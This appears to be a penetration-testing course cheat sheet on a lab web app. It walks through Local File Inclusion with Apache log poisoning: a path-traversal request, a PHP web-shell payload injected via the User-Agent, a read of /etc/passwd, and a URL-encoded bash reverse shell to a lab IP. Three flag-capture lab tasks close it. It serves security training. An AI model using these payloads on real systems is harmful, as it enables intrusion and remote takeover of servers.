# Local File Inclusion (LFI)

Log entry of Apache's access.log
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
>
># ========== Expected Result ==========
>...
>192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
>...
># =====================================
>```

Unmodified Request in Burp Repeater
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-8.png)

PHP Snippet to embed in the User Agent
>``` shell
><?php echo system($_GET['cmd']); ?>
>```

Modified Request in Burp Repeater
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-9.png)

Relative Path for the "page" parameter
>``` shell
>../../../../../../../../../var/log/apache2/access.log
>```

Output of the specified ls command through Log Poisoning
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-10.png)

Using a command with parameters
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-11.png)

IFS Example
>``` shell
>IFS=' '  # Set IFS to space
>input="cat /etc/passwd"
>
>read -r cmd arg <<< "$input"
>$cmd $arg
>```

URL encoding a space with %20
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-12.png)

Bash reverse shell one-liner
>``` shell
>bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
>```

Bash reverse shell one-liner executed as command in Bash
>``` shell
>bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
>```

URL encoded Bash TCP reverse shell one-liner
>``` shell
>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
>```

Encoded Bash reverse shell in "cmd" parameter
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Local-File-Inclusion-(LFI)-13.png)

Successful reverse shell from the target system
>``` shell
>kali@kali:~$ nc -nvlp 4444
>
># ========== Expected Result ==========
>listening on [any] 4444 ...
>connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
>bash: cannot set terminal process group (24): Inappropriate ioctl for device
>bash: no job control in this shell
># =====================================
>
>www-data@fbea640f9802:/var/www/html/meteor$ ls
>
># ========== Expected Result ==========
>admin.php
>bavarian.php
>css
>fonts
>img
>index.php
>js
># =====================================
>```

Lab 1 - Follow the steps in this section and leverage the LFI vulnerability in the web application (located at http://mountaindesserts.com/meteor/) to receive a reverse shell on WEB18 (VM #1). Get the flag from the /home/ariella/flag.txt file. To display the contents of the file, check your sudo privileges with sudo -l and use them to read the flag.
>``` shell
>
>```
>

Lab 2 - Exploit the LFI vulnerability in the web application "Mountain Desserts" on WEB18 (VM #1) (located at http://mountaindesserts.com:8001/meteor/) to execute the PHP /opt/admin.bak.php file with Burp or curl. Enter the flag from the output.
>``` shell
>
>```
>

Lab 3 - The "Mountain Desserts" web application now runs on VM #2 at http://192.168.50.193/meteor/ (The third octet of the IP address in the URL needs to be adjusted). Use the LFI vulnerability in combination with Log Poisoning to execute the dir command. Poison the access.log log in the XAMPP C:\xampp\apache\logs log directory . Find the flag in one of the files from the dir command output.
>``` shell
>
>```
>
